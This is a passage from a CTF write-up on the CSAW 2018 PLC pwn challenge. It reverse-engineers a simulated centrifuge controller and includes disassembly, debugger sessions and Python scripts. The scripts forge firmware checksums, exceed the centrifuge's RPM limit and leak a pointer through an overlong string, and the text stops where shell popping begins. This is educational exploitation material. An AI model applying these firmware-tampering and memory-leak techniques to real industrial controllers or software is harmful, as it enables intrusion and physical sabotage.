# Csaw18 plc pwn 300

This writeup is based off of: https://ctftime.org/writeup/11273

For this challenge, we are aren't given a binary, however a link to a webapp (at the time of this writeup the webapp is still up, but they probably won't keep it up forever): https://wargames.ret2.systems/csaw_2018_plc_challenge

In this web app, we see a couple of different things. The first being the source code for what appears to be our target (with comments):




```
// gcc -g -O0 -fPIE -pie -o plc plc.c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

//
// our spies could not exfiltratee the plc's header file
// so you'll have to reverse the remaining functionality...
//

#include "plc.h"
#include "sandbox.h" // disable_system()

void plc_main()
{
    char cmd[128] = {};
    
    printf(" - - - - - - - - - - - - - - - - - - - - \n");
    printf(" - PLC Remote Management Protocol v0.5 - \n");
    printf(" - - - - - - - - - - - - - - - - - - - - \n");

    while(1)
    {
        if(!fgets(cmd, sizeof(cmd), stdin))
            break;
        
        if(g_debug)
            printf("[DEBUG] PLC CMD 0x%02X\n", cmd[0]);

        // update PLC firmware
        if(cmd[0] == 'U')
            update_firmware(); 

        // execute PLC fw
        else if(cmd[0] == 'E')
            execute_firmware();
        
        // print PLC status
        else if(cmd[0] == 'S')
            print_plc_status();
        
        // reset PLC
        else if(cmd[0] == 'R')
            reset_plc();

        // Quit / disconnect from this session
        else if(cmd[0] == 'Q')
			break;
    }
}

voisubd boot_plc()
{
	puts("BOOTING PLC...");
    init_firmware();
    execute_firmware();
	plc_main();
}

void main()
{
    // disable buffering on stdout (ignore this)
    setvbuf(stdout, NULL, _IONBF, 0);

	// disable libc system() for better device security
    disable_system();

	// start the PLC
	boot_plc();
}
```

Take notice of the `disable_system` function.

## Stages

This challenge is broken up into six different stages:

```
*	Execute default PLC firmware
*	Create a PLC firmware image with a valid checksum
*	Successfully update PLC Firmware
*	Exceed Normal Centrifuge RPM Limits
*	Specify `extra` dangerous materials
*	Pop a shell
```

## Stage 0

For this stage, we just have to execute the firmware, which is fairly easy. Looking at the source code, we can see by inputting the letter `E`, we run a function called `execute_firmware()`.

```
wdb> run
Started 'csaw_plc'
BOOTING PLC...
ENRICHMENT PROCEDURE IS RUNNING
 - - - - - - - - - - - - - - - - - - - -
 - PLC Remote Management Protocol v0.5 -
 - - - - - - - - - - - - - - - - - - - - 
>> 
EENRICHMENT PROCEDURE IS RUNNING
```

With that, we pass the stage.

## Stage 1-2

For this one we have to create a plc firmware image with a correct checksum, and update with it. For this, the `update_firmware` function is probably a good place to start:

```
wdb> disas update_firmware
0xec0 <+0>:    push    rbp
0xec1 <+1>:    mov     rbp, rsp
0xec4 <+4>:    sub     rsp, 0x420
0xecb <+11>:   mov     rax, qword [fs:0x28]
0xed4 <+20>:   mov     qword [rbp-0x8], rax
0xed8 <+24>:   xor     eax, eax
0xeda <+26>:   movzx   eax, byte [rel 0x202499]
0xee1 <+33>:   test    al, al
0xee3 <+35>:   je      0xef1
0xee5 <+37>:   lea     rdi, [rel 0x15cc]  "[DEBUG] UPDATING FIRMWARE"
0xeec <+44>:   call    0x8d0 <puts>
0xef1 <+49>:   mov     dword [rbp-0x414], 0x0
0xefb <+59>:   lea     rdx, [rbp-0x410]
0xf02 <+66>:   mov     eax, 0x0
0xf07 <+71>:   mov     ecx, 0x80
0xf0c <+76>:   mov     rdi, rdx
0xf0f <+79>:   rep stosq qword [rdi]
0xf12 <+82>:   mov     rdx, qword [rel 0x202490]
0xf19 <+89>:   lea     rax, [rbp-0x410]
0xf20 <+96>:   mov     rcx, rdx
0xf23 <+99>:   mov     edx, 0x400
0xf28 <+104>:  mov     esi, 0x1
0xf2d <+109>:  mov     rdi, rax
0xf30 <+112>:  call    0x8e0 <fread>
0xf35 <+117>:  movzx   eax, byte [rbp-0x410]
0xf3c <+124>:  cmp     al, 0x46
0xf3e <+126>:  jne     0xf4b
0xf40 <+128>:  movzx   eax, byte [rbp-0x40f]
0xf47 <+135>:  cmp     al, 0x57
0xf49 <+137>:  je      0xf57
0xf4b <+139>:  mov     dword [rbp-0x414], 0x1
0xf55 <+149>:  jmp     0xfcc
0xf57 <+151>:  lea     rax, [rbp-0x410]
0xf5e <+158>:  mov     rdi, rax
0xf61 <+161>:  call    0xe06 <validate_checksum>
0xf66 <+166>:  test    eax, eax
0xf68 <+168>:  je      0xf76
0xf6a <+170>:  mov     dword [rbp-0x414], 0x2
0xf74 <+180>:  jmp     0xfcc
0xf76 <+182>:  movzx   eax, byte [rbp-0x40c]
0xf7d <+189>:  movzx   eax, al
0xf80 <+192>:  sub     eax, 0x30
0xf83 <+195>:  cmp     eax, 0x9
0xf86 <+198>:  jg      0xf9a
0xf88 <+200>:  movzx   eax, byte [rbp-0x40b]
0xf8f <+207>:  movzx   eax, al
0xf92 <+210>:  sub     eax, 0x30
0xf95 <+213>:  cmp     eax, 0x9
0xf98 <+216>:  jle     0xfa6
0xf9a <+218>:  mov     dword [rbp-0x414], 0x3
0xfa4 <+228>:  jmp     0xfcc
0xfa6 <+230>:  mov     eax, 0x0
0xfab <+235>:  call    0xb16 <reset_plc>
0xfb0 <+240>:  lea     rax, [rel 0x2024a0]
0xfb7 <+247>:  lea     rdx, [rbp-0x410]
0xfbe <+254>:  mov     ecx, 0x80
0xfc3 <+259>:  mov     rdi, rax
0xfc6 <+262>:  mov     rsi, rdx
0xfc9 <+265>:  rep movsq qword [rdi], [rsi]
0xfcc <+268>:  cmp     dword [rbp-0x414], 0x0
0xfd3 <+275>:  je      0xfe3
0xfd5 <+277>:  lea     rdi, [rel 0x15e6]  "FIRMWARE UPDATE FAILED!"
0xfdc <+284>:  call    
0x8d0 <puts>
0xfe1 <+289>:  jmp     0xfef
0xfe3 <+291>:  lea     rdi, [rel 0x15fe]  "FIRMWARE UPDATE SUCCESSFUL!"
0xfea <+298>:  call    
0x8d0 <puts>
0xfef <+303>:  movzx   eax, byte [rel 0x202499]
0xff6 <+310>:  test    al, al
0xff8 <+312>:  je      0x1013
0xffa <+314>:  mov     eax, dword [rbp-0x414]
0x1000 <+320>:  mov     esi, eax
0x1002 <+322>:  lea     rdi, [rel 0x161a]  "[DEBUG UPDATE RESULT CODE %u"
0x1009 <+329>:  mov     eax, 0x0
0x100e <+334>:  call 0x900 <printf>
0x1013 <+339>:  mov     eax, dword [rbp-0x414]
0x1019 <+345>:  mov     rsi, qword [rbp-0x8]
0x101d <+349>:  xor     rsi, qword [fs:0x28]
0x1026 <+358>:  je      0x102d0
0x1028 <+360>:  call    
0x8f0 <__stack_chk_fail>
0x102d <+365>:  leave   
0x102e <+366>:  retn       
```

Looking at the source code for this function, we see that there is no argument passed to it, so it has to scan in the firmware in the function. At `0xf30` we see that a call is made to `fread` to scan in `0x400` bytes into `rbp-0x410`. After that we can see that a call to `validate_checksum` is made with an argument being `rbp-0x410` (this is where the checksum is checked). However before that, we can see that there are two seperate checks on our input, at  `0xf3c` and `0xf47`. These two checks just check if the first character of our input (stored at `[rbp-0x410`) and the second character (stored at `[rbp-0x40f`) are equal to `F` and `W`. If those checks are passed, then `validate_checksum` is ran (if not, the update doesn't happen):

```
wdb> disas validate_checksum
0xe06 <+0>:    push    rbp
0xe07 <+1>:    mov     rbp, rsp
0xe0a <+4>:    sub     rsp, 0x20
0xe0e <+8>:    mov     qword [rbp-0x18], rdi
0xe12 <+12>:   mov     rax, qword [rbp-0x18]
0xe16 <+16>:   mov     qword [rbp-0x8], rax
0xe1a <+20>:   mov     word [rbp-0x10], 0x0
0xe20 <+26>:   mov     rax, qword [rbp-0x8]
0xe24 <+30>:   movzx   eax, word [rax+0x2]
0xe28 <+34>:   mov     word [rbp-0xe], ax
0xe2c <+38>:   mov     dword [rbp-0xc], 0x2
0xe33 <+45>:   jmp     0xe6e
0xe35 <+47>:   movzx   eax, word [rbp-0x10]
0xe39 <+51>:   shl     eax, 0xc
0xe3c <+54>:   mov     edx, eax
0xe3e <+56>:   movzx   eax, word [rbp-0x10]
0xe42 <+60>:   shr     ax, 0x40xe46 <+64>:   or      eax, edx
0xe48 <+66>:   mov     word [rbp-0x10], ax
0xe4c <+70>:   mov     eax, dword [rbp-0xc]
0xe4f <+73>:   add     word [rbp-0x10], ax
0xe53 <+77>:   mov     eax, dword [rbp-0xc]
0xe56 <+80>:   cdqe    
0xe58 <+82>:   lea     rdx, [rax+rax]
0xe5c <+86>:   mov     rax, qword [rbp-0x8]
0xe60 <+90>:   add     rax, rdx
0xe63 <+93>:   movzx   eax, word [rax]
0xe66 <+96>:   xor     word [rbp-0x10], ax
0xe6a <+100>:  add     dword [rbp-0xc], 0x1
0xe6e <+104>:  cmp     dword [rbp-0xc], 0x1ff
0xe75 <+111>:  jle     0xe35
0xe77 <+113>:  movzx   eax, byte [rel 0x202499]
0xe7e <+120>:  test    al, al
0xe80 <+122>:  je      0xeb0
0xe82 <+124>:  movzx   eax, word [rbp-0xe]
0xe86 <+128>:  mov     esi, eax
0xe88 <+130>:  lea     rdi, [rel 0x1580]  "[DEBUG] REPORTED FW CHECKSUM: %0…"
0xe8f <+137>:  mov     eax, 0x0
0xe94 <+142>:  call    0x900 <printf>
0xe99 <+147>:  movzx   eax, word [rbp-0x10]
0xe9d <+151>:  mov     esi, eax
0xe9f <+153>:  lea     rdi, [rel 0x15a8]  "[DEBUG]   ACTUAL FW CHECKSUM: %0…"
0xea6 <+160>:  mov     eax, 0x0
0xeab <+165>:  call    0x900 <printf>
0xeb0 <+170>:  movzx   eax, word [rbp-0x10]
0xeb4 <+174>:  cmp     ax, word [rbp-0xe]
0xeb8 <+178>:  setne   al
0xebb <+181>:  movzx   eax, al
0xebe <+184>:  leave   
0xebf <+185>:  retn   
```

Here we can see a loop that starts at `0xe35` and ends at `0xe6e`, which is responsible for generating the checksum. So we have two options here to figure out what the checksum should be, with the first of them being to reverse this loop. The second deals with the `printf` calls with strings containing `DEBUG` as arguments. The determination of whether or not these debug statements are printed is at `0xe8f`. To pass this check, we can just set `rax = 0x1` (`al` is the lower eight bits of `rax`), which it will lead to printing the debug statements:

```
wdb> b *validate_checksum+120
Breakpoint 5 will be evaluated as validate_checksum+120
wdb> r
Started 'csaw_plc'
BOOTING PLC...
ENRICHMENT PROCEDURE IS RUNNING
 - - - - - - - - - - - - - - - - - - - - 
 - PLC Remote Management Protocol v0.5 - 
 - - - - - - - - - - - - - - - - - - - - 
>> U
>> FW0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
000000000
Breakpoint 5: 0x557350f91e7e, validate_checksum+120
wdb> set $rax = 0x1
rax set to 0x1
wdb> c
[DEBUG] REPORTED FW CHECKSUM: 3030
[DEBUG]   ACTUAL FW CHECKSUM: 2EE7
FIRMWARE UPDATE FAILED!
```

Here we can see why the debug statements are so helpful. They tell us the checksum that we have, and the checksum we should have. With this we won't need to reverse the checksum algorithm, but just print the debug statements to see what they should be, and set them accordingly. Proceeding this, we need to write a python script to send the text, since we have to send non ascii characters like `0xe7`. Also playing around with the input a bit tells us that the third and fourth bytes of our input are the checksum.

```
import interact

p = interact.Process()

firmware = "FW" + "\xe7\x2e" + "0"*(0x400 - 2)

#data = p.readuntil('\n')
p.sendline('U')
p.sendline(firmware)

p.interactive()
```

When we run that script, we see that we pass those two stages.

## Stage 3

For this stage, we have to get the RPMs up to an unsafe level. For this, we should probably look at the `execute_firmware` function:

```
wdb> disas execute_firmware
0xbcb <+0>:    push    rbp
0xbcc <+1>:    mov     rbp, rsp
0xbcf <+4>:    sub     rsp, 0x10
0xbd3 <+8>:    mov     eax, 0x0
0xbd8 <+13>:   call    0xb16 <reset_plc>
0xbdd <+18>:   movzx   eax, byte [rel 0x202499]
0xbe4 <+25>:   test    al, al
0xbe6 <+27>:   je      0xbf4
0xbe8 <+29>:   lea     rdi, [rel 0x14b1]  "[DEBUG] BEGIN EXECUTION"
0xbef <+36>:   call    0x8d0 <puts>
0xbf4 <+41>:   mov     byte [rbp-0x9], 0x0
0xbf8 <+45>:   mov     dword [rbp-0x8], 0x6
0xbff <+52>:   mov     dword [rbp-0x4], 0x0
0xc06 <+59>:   jmp     0xd8b
0xc0b <+64>:   mov     edx, dword [rbp-0x8]
0xc0e <+67>:   lea     rax, [rel 0x2024a0]
0xc15 <+74>:   movzx   eax, byte [rdx+rax]
0xc19 <+78>:   mov     byte [rbp-0x9], al
0xc1c <+81>:   movzx   eax, byte [rel 0x202499]
0xc23 <+88>:   test    al, al
0xc25 <+90>:   je      0xc41
0xc27 <+92>:   movzx   edx, byte [rbp-0x9]
0xc2b <+96>:   mov     eax, dword [rbp-0x8]
0xc2e <+99>:   mov     esi, eax
0xc30 <+101>:  lea     rdi, [rel 0x14c9]  "[DEBUG] 0x%03X: OP %02X\n"
0xc37 <+108>:  mov     eax, 0x0
0xc3c <+113>:  call    0x900 <printf>
0xc41 <+118>:  cmp     byte [rbp-0x9], 0x30
0xc45 <+122>:  jne     0xc5a
0xc47 <+124>:  mov     dword [rel 0x2028a0], 0x0
0xc51 <+134>:  add     dword [rbp-0x8], 0x1
0xc55 <+138>:  jmp     0xd8b
0xc5a <+143>:  cmp     byte [rbp-0x9], 0x31
0xc5e <+147>:  jne     0xc81
0xc60 <+149>:  cmp     dword [rbp-0x4], 0x0
0xc64 <+153>:  je      0xc78
0xc66 <+155>:  sub     dword [rbp-0x4], 0x1
0xc6a <+159>:  mov     edx, dword [rbp-0x4]
0xc6d <+162>:  lea     rax, [rel 0x2028a4]
0xc74 <+169>:  mov     byte [rdx+rax], 0x0
0xc78 <+173>:  add     dword [rbp-0x8], 0x1
0xc7c <+177>:  jmp     0xd8b
0xc81 <+182>:  cmp     byte [rbp-0x9], 0x32
0xc85 <+186>:  jne     0xcba
0xc87 <+188>:  mov     eax, dword [rbp-0x4]
0xc8a <+191>:  lea     edx, [rax+0x1]
0xc8d <+194>:  mov     dword [rbp-0x4], edx
0xc90 <+197>:  mov     edx, dword [rbp-0x8]
0xc93 <+200>:  add     edx, 0x1
0xc96 <+203>:  mov     ecx, edx
0xc98 <+205>:  lea     rdx, [rel 0x2024a0]
0xc9f <+212>:  movzx   edx, byte [rcx+rdx]
0xca3 <+216>:  mov     ecx, edx
0xca5 <+218>:  mov     edx, eax
0xca7 <+220>:  lea     rax, [rel 0x2028a4]
0xcae <+227>:  mov     byte [rdx+rax], cl
0xcb1 <+230>:  add     dword [rbp-0x8], 0x2
0xcb5 <+234>:  jmp     0xd8b
0xcba <+239>:  cmp     byte [rbp-0x9], 0x33
0xcbe <+243>:  jne     0xce7
0xcc0 <+245>:  mov     eax, dword [rbp-0x8]
0xcc3 <+248>:  add     eax, 0x1
0xcc6 <+251>:  mov     edx, eax
0xcc8 <+253>:  lea     rax, [rel 0x2024a0]
0xccf <+260>:  movzx   eax, byte [rdx+rax]
0xcd3 <+264>:  cmp     al, 0x31
0xcd5 <+266>:  sete    al
0xcd8 <+269>:  mov     byte [rel 0x2028e4], al
0xcde <+275>:  add     dword [rbp-0x8], 0x2
0xce2 <+279>:  jmp     0xd8b
0xce7 <+284>:  cmp     byte [rbp-0x9], 0x36
0xceb <+288>:  jne     0xd1d
0xced <+290>:  mov     eax, dword [rel 0x2028a0]
0xcf3 <+296>:  cmp     eax, 0x3e7
0xcf8 <+301>:  jg      0xd06
0xcfa <+303>:  mov     dword [rel 0x2028a0], 0x0
0xd04 <+313>:  jmp     0xd17
0xd06 <+315>:  mov     eax, dword [rel 0x2028a0]
0xd0c <+321>:  sub     eax, 0x3e8
0xd11 <+326>:  mov     dword [rel 0x2028a0], eax
0xd17 <+332>:  add     dword [rbp-0x8], 0x1
0xd1b <+336>:  jmp     0xd8b
0xd1d <+338>:  cmp     byte [rbp-0x9], 0x37
0xd21 <+342>:  jne     0xd3a
0xd23 <+344>:  mov     eax, dword [rel 0x2028a0]
0xd29 <+350>:  add     eax, 0x3e8
0xd2e <+355>:  mov     dword [rel 0x2028a0], eax
0xd34 <+361>:  add     dword [rbp-0x8], 0x1
0xd38 <+365>:  jmp     0xd8b
0xd3a <+367>:  cmp     byte [rbp-0x9], 0x38
0xd3e <+371>:  jne     0xd64
0xd40 <+373>:  mov     eax, dword [rbp-0x8]
0xd43 <+376>:  add     eax, 0x1
0xd46 <+379>:  mov     edx, eax
0xd48 <+381>:  lea     rax, [rel 0x2024a0]
0xd4f <+388>:  movzx   eax, byte [rdx+rax]
0xd53 <+392>:  cmp     al, 0x31
0xd55 <+394>:  sete    al
0xd58 <+397>:  mov     byte [rel 0x202499], al
0xd5e <+403>:  add     dword [rbp-0x8], 0x2
0xd62 <+407>:  jmp     0xd8b
0xd64 <+409>:  cmp     byte [rbp-0x9], 0x39
0xd68 <+413>:  je      0xd9a
0xd6a <+415>:  movzx   eax, byte [rbp-0x9]
0xd6e <+419>:  mov     esi, eax
0xd70 <+421>:  lea     rdi, [rel 0x14e8]  "[ERROR] INVALID INSTRUCTION %02X…"
0xd77 <+428>:  mov     eax, 0x0
0xd7c <+433>:  call    0x900 <printf>
0xd81 <+438>:  mov     edi, 0x1
0xd86 <+443>:  call    0x950 <exit>
0xd8b <+448>:  cmp     dword [rbp-0x8], 0x3fe
0xd92 <+455>:  jbe     0xc0b
0xd98 <+461>:  jmp     0xd9b
0xd9a <+463>:  nop     
0xd9b <+464>:  mov     eax, dword [rel 0x2028a0]
0xda1 <+470>:  cmp     eax, 0x109a0
0xda6 <+475>:  jle     0xdf7
0xda8 <+477>:  movzx   eax, byte [rel 0x2028e4]
0xdaf <+484>:  test    al, al
0xdb1 <+486>:  je      0xdc3
0xdb3 <+488>:  mov     rdx, qword [rel 0x2028e8]
0xdba <+495>:  mov     eax, 0x0
0xdbf <+500>:  call    rdx
0xdc1 <+502>:  jmp     0xe03
0xdc3 <+504>:  lea     rdi, [rel 0x150a]  "[FAILSAFE]"
0xdca <+511>:  call    0x8d0 <puts>
0xdcf <+516>:  lea     rdi, [rel 0x1518]  "[FAILSAFE] EXCEEDED SAFE RPM LIM…"
0xdd6 <+523>:  call    0x8d0 <puts>
0xddb <+528>:  lea     rdi, [rel 0x150a]  "[FAILSAFE]"
0xde2 <+535>:  call    0x8d0 <puts>
0xde7 <+540>:  mov     rdx, qword [rel 0x2028f0]
0xdee <+547>:  mov     eax, 0x0
0xdf3 <+552>:  call    rdx
0xdf5 <+554>:  jmp     0xe03
0xdf7 <+556>:  lea     rdi, [rel 0x1560]  "ENRICHMENT PROCEDURE IS RUNNING"
0xdfe <+563>:  call    0x8d0 <puts>
0xe03 <+568>:  nop     
0xe04 <+569>:  leave   
0xe05 <+570>:  retn   
```

Looking at this function, pretty early at `0xc06` we cab see that it jumps to `0xd8b` without a preceeding conditional. At `0xd8b` we see that it makes a comparison, and depending on the result it will either jump to `0xc0b` or `0xd9b`. Setting a breakpoint for this and stepping through the code execution tells us that it will jump to `0xc0b`. From there we can see what looks like another debug check, which is then followed by a list of comaprisons to the ascii characters `1` (at `0xc5a`), `2` (at `0xc81`), `3`, `6`, `7`, `8`, and `9`. Since there are no other comparisons like this in this function, we can guess that these numbers are the rpm rates which we can set the centrifuge to. What I did to  test this was just edit the script I used before to send those codes 1 by 1, and see if I got anything (also changed the checksum to check out each time). Doing that I discovered that `7` was the magic number:

```
$ python exploit.py
BOOTING PLC
ENRICHMENT PROCEDURE IS RUNNING
 - - - - - - - - - - - - - - - - - - - -
 - PLC Remote Management Protocol v0.5 - 
 - - - - - - - - - - - - - - - - - - - - 
FIRMWARE UPDATE SUCCESSFUL!
$ E
[FAILSAFE]
[FAILSAFE] EXCEEDED SAFE RPM LIMITS! COMMENCING EMERGENCY SHUTDOWN
[FAILSAFE]
```

With that, we complete this stage. The code for that script is:
```
import interact

p = interact.Process()

firmware = "FW" + "\xbd\x35" + "7"*(0x400 - 2)

#data = p.readuntil('\n')
p.sendline('U')
p.sendline(firmware)

p.interactive()
```

## Stage 4

For this stage, we have to specify extra dangerous materials. For this, it is helpful to note the material before and after the firmware we loaded:

before:
```
>> S
+------------------------------------------------------+
| -[ PLC STATUS                                        |
+------------------------------------------------------+  
	* FW VERSION: v1.2  
	* FW CHECKSUM: AA61  
	* CENTRIFUGE RPM: 63000 RPM  
	* ENRICHMENT MATERIAL: URANIUM HEXAFLUORIDE  
	* OVERRIDE: ACTIVE
```

after:
```
$ S
+------------------------------------------------------+
| -[ PLC STATUS                                        |  
+------------------------------------------------------+
  * FW VERSION: v7.7
  * FW CHECKSUM: 35BD
  * CENTRIFUGE RPM: 0 RPM
  * ENRICHMENT MATERIAL: <none>  
  * OVERRIDE: DISABLED
```

So we can see here, that the firmware obviously controls the enrichment material. However we can see that this function prints the encrichment materials, so by looking at it, we can probably tell where it is:

```
wdb> disas print_plc_status
0x102f <+0>:    push    rbp
0x1030 <+1>:    mov     rbp, rsp
0x1033 <+4>:    movzx   eax, byte [rel 0x202499]
0x103a <+11>:   test    al, al
0x103c <+13>:   je      0x104a
0x103e <+15>:   lea     rdi, [rel 0x1638]  "[DEBUG] PRINTING PLC STATUS"
0x1045 <+22>:   call    0x8d0 <puts>
0x104a <+27>:   lea     rdi, [rel 0x1658]  "+-------------------------------…"
0x1051 <+34>:   call    0x8d0 <puts>
0x1056 <+39>:   lea     rdi, [rel 0x1698]  "| -[ PLC STATUS                 …"
0x105d <+46>:   call    0x8d0 <puts>
0x1062 <+51>:   lea     rdi, [rel 0x1658]  "+-------------------------------…"
0x1069 <+58>:   call    0x8d0 <puts>
0x106e <+63>:   movzx   eax, byte [rel 0x2024a5]
0x1075 <+70>:   movzx   edx, al
0x1078 <+73>:   movzx   eax, byte [rel 0x2024a4]
0x107f <+80>:   movzx   eax, al
0x1082 <+83>:   mov     esi, eax
0x1084 <+85>:   lea     rdi, [rel 0x16d1]  "  * FW VERSION: v%c.%c\n"
0x108b <+92>:   mov     eax, 0x0
0x1090 <+97>:   call    0x900 <printf>
0x1095 <+102>:  lea     rax, [rel 0x2024a2]
0x109c <+109>:  movzx   eax, word [rax]
0x109f <+112>:  movzx   eax, ax
0x10a2 <+115>:  mov     esi, eax
0x10a4 <+117>:  lea     rdi, [rel 0x16e9]  "  * FW CHECKSUM: %04X\n"
0x10ab <+124>:  mov     eax, 0x0
0x10b0 <+129>:  call    0x900 <printf>
0x10b5 <+134>:  mov     eax, dword [rel 0x2028a0]
0x10bb <+140>:  mov     esi, eax
0x10bd <+142>:  lea     rdi, [rel 0x1700]  "  * CENTRIFUGE RPM: %d RPM\n"
0x10c4 <+149>:  mov     eax, 0x0
0x10c9 <+154>:  call    0x900 <printf>
0x10ce <+159>:  lea     rsi, [rel 0x2028a4]
0x10d5 <+166>:  lea     rdi, [rel 0x171c]  "  * ENRICHMENT MATERIAL: %s\n"
0x10dc <+173>:  mov     eax, 0x0
0x10e1 <+178>:  call    0x900 <printf>
0x10e6 <+183>:  movzx   eax, byte [rel 0x2028e4]
0x10ed <+190>:  test    al, al
0x10ef <+192>:  je      0x10ff
0x10f1 <+194>:  lea     rdi, [rel 0x1739]  "  * OVERRIDE: ACTIVE"
0x10f8 <+201>:  call    0x8d0 <puts>
0x10fd <+206>:  jmp     0x110b
0x10ff <+208>:  lea     rdi, [rel 0x174e]  "  * OVERRIDE: DISABLED"
0x1106 <+215>:  call    0x8d0 <puts>
0x110b <+220>:  nop     
0x110c <+221>:  pop     rbp
0x110d <+222>:  retn 
```

So with this function, we can see that the checksum is stored at `0x2024a2`, which we know where that correlates to our input. We can also see that the `FW VERSION` is stored at `0x2024a4` and `0x2024a5`, so it is the two bytes immediately following our checksum. However for the enrichment material, we can see it is stored at `0x2028a4`, which is about `1023` bytes away from our input, which is out of our `0x400` byte grasp. 

The encrichment material is probably set in `execute_firmware`. The reason for this is because, when we launch the program the material is set, and prior to us being able to give input to the program, we see that it makes ac all to that function after loading it's own shellcode with `init_firmware`. It might help to see what the original firmware is. When we disassembly the `init_firmware` function, we see a place where we can easily do that:

```
wdb> disas init_firmware
0xb91 <+0>:    push    rbp
0xb92 <+1>:    mov     rbp, rsp
0xb95 <+4>:    movzx   eax, byte [rel 0x202499]
0xb9c <+11>:   test    al, al
0xb9e <+13>:   je      0xbac
0xba0 <+15>:   lea     rdi, [rel 0x1488]  "[DEBUG] INITIALIZING DEFAULT FIR…"
0xba7 <+22>:   call    0x8d0 <puts>
0xbac <+27>:   lea     rax, [rel 0x2024a0]
0xbb3 <+34>:   lea     rdx, [rel 0x202080]
0xbba <+41>:   mov     ecx, 0x80
0xbbf <+46>:   mov     rdi, rax
0xbc2 <+49>:   mov     rsi, rdx
0xbc5 <+52>:   rep movsq qword [rdi], [rsi]
0xbc8 <+55>:   nop     
0xbc9 <+56>:   pop     rbp
0xbca <+57>:   retn  
```

Here we can see that after it does another debug check, at `0xbc5` it moves data from one ptr to another. When we break there, we can see it moving the initial firmware:

```
wdb> b *init_firmware+52
Breakpoint 4 will be evaluated as init_firmware+52
wdb> r
Started 'csaw_plc'BOOTING PLC...
Breakpoint 4: 0x557108b35bc5, init_firmware+52
wdb> x/x $rdi0x559a44dc54a0: 0x00000000
wdb> x/x $rsi0x559a44dc5080: 0xaa615746
wdb> x/2s $rsi
0x559a44dc5080: "FWaª1280312U2R2A2N2I2U2M2 2H2E2X2A2F2L2U2O2R2I2D2E2"
0x559a44dc50b4: "7777777777777777777777777777777777777777777777777777777777777779"
wdb> x/48x $rsi0x559a44dc5080: 0xaa615746    0x30383231    0x55323133    0x413252320x559a44dc5090: 0x49324e32    0x4d325532    0x48322032    0x583245320x559a44dc50a0: 0x46324132    0x55324c32    0x52324f32    0x443249320x559a44dc50b0: 0x00324532    0x37373737    0x37373737    0x373737370x559a44dc50c0: 0x37373737    0x37373737    0x37373737    0x373737370x559a44dc50d0: 0x37373737    0x37373737    0x37373737    0x373737370x559a44dc50e0: 0x37373737    0x37373737    0x37373737    0x373737370x559a44dc50f0: 0x39373737    0x00000000    0x00000000    0x000000000x559a44dc5100: 0x00000000    0x00000000    0x00000000    0x000000000x559a44dc5110: 0x00000000    0x00000000    0x00000000    0x000000000x559a44dc5120: 0x00000000    0x00000000    0x00000000    0x000000000x559a44dc5130: 0x00000000    0x00000000    0x00000000    0x00000000
```
 
 So we can see the original firmware `FWaª1280312U2R2A2N2I2U2M2 2H2E2X2A2F2L2U2O2R2I2D2E2\x007777777777777777777777777777777777777777777777777777777777777779`. We can also see the string `URANIUM HEXAFLUORIDE` (and the version number `1.2`) in the firmware. Also if we examine the remaining bytes to reach `0x400` bytes, we see that the remained is just null bytes to fill the space. 
 
 One pattern that we see starting imeditately after the `12` version bytes, is every other character matches with the 7 characters used for comparisons in `execute_function` (`1, 2, 3, 6, 7, 8, 9`). The second character is an argument to the code. With this I decided to reverse out some of the codes:
 
```
2:	We can see that this code path writes to the address 0x2028a4, which in the print_plc function we see is where the Materials name is stored. That coupled with the default firmware tells us that this code writes a single byute to the materials string.
8:	This one we see writes to the memory address 0x2024a0, which we see the proceeding byte 0x202499 is always referenced before a debug check, so this is probably the setting to turn on/off debugging. Switching the argument to 1, we see that it turns on debugging.
9:	We see that in the default firmware it is the last value before the null bytes, and looking at the code path that happens when it's conditional is true we see it leads us to the end of the code. From that we can tell that it probably a terminator that just says that the code has ended.
```

Proceeding that, now that we know the code to write to the materials we can go a head and do that. However after we do it, we see that we don't get credit for this stage, so there is still something we are missing.:

```
wdb> b *print_plc_status+178
Breakpoint 2 will be evaluated as print_plc_status+178
wdb> r
Started 'csaw_plc'
BOOTING PLC...
ENRICHMENT PROCEDURE IS RUNNING
 - - - - - - - - - - - - - - - - - - - -
 - PLC Remote Management Protocol v0.5 - 
 - - - - - - - - - - - - - - - - - - - - 
>> S
+------------------------------------------------------+
| -[ PLC STATUS                                        |
+------------------------------------------------------+  
	* FW VERSION: v1.2  
	* FW CHECKSUM: AA61  
	* CENTRIFUGE RPM: 63000 RPM
Breakpoint 2: 0x5571596770e1, print_plc_status+178
wdb> p $rsi
$1 = 0x5571598788a4
wdb> x/x $rsi
0x5571598788a4: 0x4e415255
wdb> x/s $rsi
0x5571598788a4: "URANIUM HEXAFLUORIDE"
wdb> x/20x $rsi 0x5571598788a4: 0x4e415255    0x204d5549    0x41584548    0x4f554c46
0x5571598788b4: 0x45444952    0x00000000    0x00000000    0x00000000
0x5571598788c4: 0x00000000    0x00000000    0x00000000    0x00000000
0x5571598788d4: 0x00000000    0x00000000    0x00000000    0x00000000
0x5571598788e4: 0x00000001    0x59676ab0    0x00005571    0x04380ec
```

So we can see the materials string starting at `0x5571598788a4`. However we can see that `68` bytes away there is a ptr. What we can do is we can make our materials string `68` bytes long (totally within our `0x400` byte reach), that way when we print it since there will be no null bytes between that and this ptr, we will leak it. Once we do that, we find that we complete this stage. Here is the code I used to do it:

```
import interact

p = interact.Process()
x = "FW" + "\x3b\x46" + "1281312l2e2r2o2y2j2e2n2k2i2n2s2202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202097777777777777777777777777777777777777777777777777777777777777779"

firmware = x + "\x00"*(0x400 - len(x))

#data = p.readuntil('\n')
p.sendline('U')
p.sendline(firmware)

p.interactive()
```

## Stage 5

The last thing to do is pop a shell. For this we will probably need to find a bug that allows us to get code execution. However we already have a bug, that allows for an infoleak. When we take a closer look at the memory layout of what exactly we're leaking, we see something interesting:

```
